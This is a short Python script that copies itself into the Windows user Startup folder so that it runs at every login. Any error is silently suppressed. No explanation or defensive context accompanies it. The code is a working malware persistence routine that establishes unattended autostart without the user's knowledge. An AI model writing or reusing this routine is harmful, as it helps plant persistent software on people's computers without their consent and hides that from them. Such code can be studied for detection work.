import os
import shutil
current_script = os.path.abspath(__file__)
startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
try:
    shutil.copy2(current_script, startup_folder)
except Exception as e:
    pass